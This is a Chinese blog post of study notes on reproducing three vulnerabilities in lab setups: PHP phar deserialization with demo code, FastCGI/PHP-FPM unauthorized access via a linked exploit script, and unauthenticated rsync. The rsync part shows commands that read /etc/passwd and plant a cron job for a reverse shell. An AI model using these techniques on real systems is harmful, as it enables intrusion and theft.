---
title: phar & fastcgi & rsync 漏洞小结
date: 2018-10-14 20:02:29
tags:
---

# 前言

几个简单复现了下的漏洞类型，但是又我之前没学过的。

总是喜欢记录一下，但是又不想分开三篇来记录，就合到了一篇里面。

# phar反序列化

前段时间black hat会议上新提出的一种攻击手法（但orange师傅2017年就用这个在hitcon出过题）

主要是利用`phar://`协议在解析数据的时候，会触发一次`unserialize`，从而产生反序列化

## phar文件格式

文件格式里有那么几个比较重要的参数

### stub

为一个phar的标志，格式为

```
xxx<?php xxx; __HALT_COMPILER();?>
```

后面必须以`__HALT_COMPILER();?>`结尾，否则无法识别

### manifest

会以**序列化**形式存储用户自定义的`meta-data`

也就是这块内容在解析的时候会被反序列化，从而产生反序列化漏洞

### file contens

被压缩的文件内容

### signature

文件签名

## demo

首先测试生成一个`phar`文件

```php
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("1.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
```

主要要设置的就三个值

- `setStub`： 一般为固定值 `<?php __HALT_COMPILER(); ?>`或者也可以添加一些自定义文件头之类的
- `setMetadata`：需要反序列化的类
- `addFormString`：文件名和文件内容可以随意填，这里文件名（这里为`test.txt`到后续需要使用


重命名为`1.jpg`，然后尝试触发

```php
<?php 
    class TestObject {
        public function __destruct() {
            echo 'Destruct called';
        }
    }
    $filename = 'phar://1.jpg/test.txt';
    file_exists($filename); 
?>
```

![](phar-fastcgi-rsync-漏洞小结\2.png)

`test.txt`就是之前的文件名，成功反序列化

而且可以触发的函数也比较多

![1](phar-fastcgi-rsync-漏洞小结\1.png)

## 注意事项

需要注意的就是，文件存在的时候需要先删掉才能重建

文件后缀必须为`.phar`，但是生成好之后可以改

这样，无疑极大的拓展了反序列化的攻击面，无需强制使用`unserialize`。只要能完全控制文件名，甚至文件名的前面一部分，就可以触发反序列化。感觉触发的场景无疑多了许多，主要任务就是寻找pop chain了。



# Fast-cgi未授权访问

## 漏洞原理

Fastcgi是一种跟高效的php与webserver之间通信的协议。

PHP-FPM是一个fastcgi协议解析器，webserver将用户请求按照fastcgi的规则打包好后传给FPM。

当fastcgi端口（默认为9000）暴露在公网中时，就可以伪造fastcgi协议通信内容，从而执行php

当端口没有暴露的时候，也是可以通过SSRF进行攻击的

具体原理和分析可以看https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html

## 复现

漏洞环境用p神的vulhub

https://github.com/vulhub/vulhub/tree/master/fpm

脚本

https://github.com/kingkaki/Exploit-scripts/blob/master/fast-cgi/fpm.py

![](phar-fastcgi-rsync-漏洞小结\3.png)



# rsync 未授权访问漏洞

> rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。

在没有设置密码的时候，就可以任意文件读取和写入，在内网渗透的时候用处较大

  

可以通过访问`/src`目录看到备份了的文件

```
rsync rsync://localhost:873/src/
```

或者

```
rsync 127.0.0.1::src
```



![](phar-fastcgi-rsync-漏洞小结\4.png)

  

任意文件下载

```
rsync -av  rsync://localhost:873/src/etc/passwd ./
```

![](phar-fastcgi-rsync-漏洞小结\5.png)

  

还可以写入文件，例如写一个定时任务，反弹shell

```
rsync -av shell rsync://localhost:873/src/etc/cron.d/shell
```

![](phar-fastcgi-rsync-漏洞小结\6.png)



# Reference

https://paper.seebug.org/680/

https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html

https://github.com/vulhub/vulhub